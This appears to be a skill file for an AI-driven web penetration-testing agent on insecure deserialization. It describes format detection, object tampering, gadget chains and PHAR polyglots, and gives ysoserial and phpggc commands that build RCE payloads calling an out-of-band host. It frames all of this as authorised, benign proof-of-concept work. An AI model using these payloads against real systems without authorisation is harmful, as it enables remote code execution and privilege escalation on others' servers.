---
name: deserialization
description: "Insecure deserialization -> object injection, priv-esc, gadget-chain RCE. Use when a serialized blob comes from the client: Java (rO0AB / AC ED), PHP (O:8:), .NET (__VIEWSTATE, BinaryFormatter, TypeNameHandling), Python pickle, Ruby Marshal. Tools: ysoserial, phpggc, PHAR."
---

# Insecure Deserialization

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


Deserialization turns an attacker-supplied byte stream back into a live object. If the app deserializes data the client controls, you can tamper with object state, inject objects of unexpected classes, and chain pre-existing methods ("gadgets") into a sink that gives RCE. The danger fires *during* deserialization — post-deserialization validation is too late.

## When to test
Any serialized blob accepted from the client and deserialized server-side:
- Cookies, request params, hidden form fields, headers, or message-queue bodies carrying object state.
- Auth/session tokens that aren't JWTs but encode object data.
- `__VIEWSTATE` / `__VIEWSTATEGENERATOR` (ASP.NET), `BinaryFormatter`/`NetDataContractSerializer`/`Json.NET TypeNameHandling` payloads.
- File-upload features that PHP later touches with filesystem functions (PHAR vector).
- Anything that round-trips an object to the client and back — recognise the format first (see Detection).

## Impact & priority — be honest
- Insecure deserialization → **RCE = top-tier P1**. This is one of the highest-value web bugs; treat a working OAST/sleep callback as critical and stop there.
- Also delivers **privilege escalation / auth bypass** (flip `isAdmin`, type-juggle a password), arbitrary file read/write, and DoS.
- The bug is not "serialized data exists" — it's **controllable deserialization reaching a gadget or trusted field**. No reachable sink, no finding.

## Detection — recognise the format
- **PHP** — human-readable: `O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}`. Markers: `O:` object, `a:` array, `s:` string, `i:` int, `b:` bool. Often URL/base64-encoded in a cookie.
- **Java** — binary starting `AC ED 00 05` (hex) / `rO0AB` (base64), frequently `rO0AB...` in a cookie or param.
- **.NET** — `__VIEWSTATE` base64 (look for unsigned/no-MAC ViewState), or BinaryFormatter/LosFormatter blobs; `Json.NET` with `"$type":` indicates `TypeNameHandling`.
- **Python pickle** — base64 of opcodes; often starts `gAS` / `gAJ` (protocol 2+) or `(dp0`/`(lp0` (ASCII protocol 0); look for trailing `.`.
- **Ruby/Marshal** — binary beginning `\x04\x08` (base64 `BAh`).
- Probe: change one byte and watch for parser/deserialization errors that reveal the format.

## Exploitation
- **Modify object fields** — decode, flip values (`isAdmin` b:0→b:1), fix any length prefixes (`s:6:"carlos"` → `s:5:"admin"`), re-encode. Privesc/auth bypass when the app trusts deserialized state.
- **PHP type juggling** — set a compared field to int `0`; loose `==` may match non-numeric strings (mitigated in PHP 8 for pure strings, but numeric-prefix strings still coerce).
- **Magic methods** — `__wakeup()`/`__destruct()`/`__toString()` (PHP), `readObject()` (Java) run automatically on deserialization; these are gadget entry points.
- **Inject arbitrary objects** — deserialization rarely type-checks, so supply any serializable class to reach different code paths.
- **Gadget chains** — link a kick-off gadget through intermediate gadgets to a dangerous sink. You control only the data; the code already exists in the app/its libraries.
- **Tooling**: `ysoserial` (Java), `PHPGGC` (PHP). Use pre-built chains first; build custom chains only with source access.
- **PHAR deserialization (PHP)** — `phar://` implicitly deserializes manifest metadata via filesystem calls (`file_exists`, `file_get_contents`, etc.). Upload a PHAR polyglot (e.g. valid JPEG + PHAR) and trigger a `phar://` path.
- **Always prove with a harmless action — OAST/DNS callback or `sleep` — never a destructive gadget payload.**

## Common bypasses
Signed/encrypted ViewState, magic-byte filters, allowlists, PHP 8 `==` changes, version-specific chain selection, memory-corruption-only sinks → see `reference.md`.

## Minimal PoC (for ./_EXPLOIT/)
Generate a benign, no-impact chain that only proves code execution:
- **Blind Java detection (any version, no library needed):** `java -jar ysoserial.jar URLDNS http://<id>.oast.example` → base64-encode → place in the serialized field → confirm the DNS hit in Collaborator/OAST. For firewalled blind cases use `JRMPClient` and time the response.
- **Java RCE proof:** `java -jar ysoserial.jar CommonsCollections6 'nslookup <id>.oast.example'` (or `sleep 10`) — DNS callback / measurable delay = proven, no destructive command.
- **PHP RCE proof:** `phpggc -b Monolog/RCE1 system 'curl http://<id>.oast.example'` (or `sleep 10`), base64 into the cookie/param. For PHAR: `phpggc -p phar -o evil.phar -j Monolog/RCE1 system '...'`, upload, trigger via `phar://`.
- Log the single decode→tamper→encode→send sequence (or one `curl`) plus the OAST evidence to `./_EXPLOIT/`. Stop at proof — no shells, no file destruction, no data dumps.

## Don't report as noise
- Serialized data present but **no controllable deserialization sink** (read-only display, server re-validates signature/MAC before deserializing).
- Signed/encrypted blobs where you don't have the key and can't bypass the integrity check.
- A magic byte recognised but **no reachable gadget** and no trusted-field tampering effect.
- Tampering that throws an error with no security consequence. Prove impact (callback/privesc) or discard.

## Deep reference
See `reference.md` for format internals, tampering walkthroughs, magic-method/gadget detail, ysoserial & PHPGGC usage, PHAR polyglots, .NET/Python/Ruby specifics, and prevention.
- https://portswigger.net/web-security/deserialization
- https://portswigger.net/web-security/deserialization/exploiting
